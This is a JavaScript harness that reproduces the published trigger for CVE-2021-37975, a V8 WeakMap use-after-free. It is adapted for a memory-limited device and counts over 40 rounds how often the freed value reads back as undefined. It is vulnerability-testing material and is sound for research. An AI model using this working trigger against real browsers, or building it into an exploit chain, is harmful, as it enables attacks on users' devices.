// CVE-2021-37975 trigger, from the Project Zero RCA (Man Yue Mo, GitHub Security
// Lab). The PoC is used verbatim except:
//   * a print shim, and
//   * the GC buffer is 128 MB instead of 0x7fe00000 — 512 MB and above raise
//     RangeError on this device (measured).
//
// The RCA's outcome test is exact and needs no addresses: `v9` is set in the
// weak map and referenced only weakly, so a successful use-after-free shows the
// value as `undefined`. A live object means the bug did not fire that round.
var print = (typeof print === 'function') ? print : function () { };

var initKey = { init: 1 };
var level = 4;
var map1 = new WeakMap();
var GC_SIZE = 0x08000000;   // 128 MB; upstream 0x7fe00000 (2 GB)
var CHUNK = 0x04000000;     // 64 MB; allocated until failure to force a full GC

// Upstream provokes a 2 GB allocation FAILURE, which is what drives a full
// mark-compact. This device cannot reach 2 GB, so the failure is manufactured by
// allocating chunks until the allocator refuses, then releasing them.
// `new ArrayBuffer` is OFF-heap: it grows no marking worklist. To make a major
// mark-compact with real ephemeron processing happen, the V8 heap itself has to
// grow, so allocate many small objects that must be traced.
function forceOnHeapPressure(blocks, perBlock) {
  var keep = [];
  for (var i = 0; i < blocks; i++) {
    var block = new Array(perBlock);
    for (var j = 0; j < perBlock; j++) {
      block[j] = { i: i, j: j, s: 'pad' + j };
    }
    keep.push(block);
  }
  return keep.length;
}

function forceAllocationFailure() {
  var held = [];
  var chunks = 0;
  try {
    while (chunks < 64) { held.push(new ArrayBuffer(CHUNK)); chunks++; }
  } catch (e) { /* expected: this is the trigger */ }
  held = null;
  return chunks;
}

function hideWeakMap(map, level, initKey) {
  let prevMap = map;
  let prevKey = initKey;
  for (let i = 0; i < level; i++) {
    let thisMap = new WeakMap();
    prevMap.set(prevKey, thisMap);
    let thisKey = { 'h': i };
    thisMap.set(prevKey, thisKey);
    prevMap = thisMap;
    prevKey = thisKey;
    if (i == level - 1) {
      let retMap = new WeakMap();
      map.set(thisKey, retMap);
      return thisKey;
    }
  }
}

function getHiddenKey(map, level, initKey) {
  let prevMap = map;
  let prevKey = initKey;
  for (let i = 0; i < level; i++) {
    let thisMap = prevMap.get(prevKey);
    let thisKey = thisMap.get(prevKey);
    prevMap = thisMap;
    prevKey = thisKey;
    if (i == level - 1) { return thisKey; }
  }
}

function setUpWeakMap(map) {
  let hk = hideWeakMap(map, level, initKey);
  let hiddenMap = map.get(hk);
  let map7 = new WeakMap();
  let map8 = new WeakMap();
  let k5 = { k5: 1 };
  let map5 = new WeakMap();
  let k7 = { k7: 1 };
  let k9 = { k9: 1 };
  let k8 = { k8: 1 };
  let v9 = {};
  map.set(k7, map7);
  map.set(k9, v9);
  hiddenMap.set(k5, map5);
  hiddenMap.set(hk, k5);
  map5.set(hk, k7);
  map7.set(k8, map8);
  map7.set(k7, k8);
  map8.set(k8, k9);
  // NOTE: nothing is returned. Keeping even one strong reference to v9 makes it
  // reachable and the use-after-free impossible — an earlier revision returned
  // {v9, k8} and could never fire for that reason alone.
}

var trials = 0;
var hits = 0;
var rounds = 40;

for (var r = 0; r < rounds; r++) {
  try {
    // Fresh map each round: the RCA reuses one global, but that accumulates
    // entries and changes the ephemeron ordering the bug depends on.
    map1 = new WeakMap();
    setUpWeakMap(map1);
    var blockCount = forceOnHeapPressure(400, 500);
    if (r === 0) { print('[+]onheap blocks=' + blockCount); }
    let hiddenKey = getHiddenKey(map1, level, initKey);
    let hiddenMap = map1.get(hiddenKey);
    let k7 = hiddenMap.get(hiddenMap.get(hiddenKey)).get(hiddenKey);
    let k8 = map1.get(k7).get(k7);
    let map8 = map1.get(k7).get(k8);
    var observed = map1.get(map8.get(k8));
    trials++;
    if (observed === undefined) { hits++; }
  } catch (err) {
    print('[+]round ' + r + ' threw ' + err.name);
  }
}

print('[+]rca37975 trials=' + trials + ' freed=' + hits +
      ' verdict=' + (hits > 0 ? 'FIRES' : 'no-fire'));
print('[+]rca37975-done');
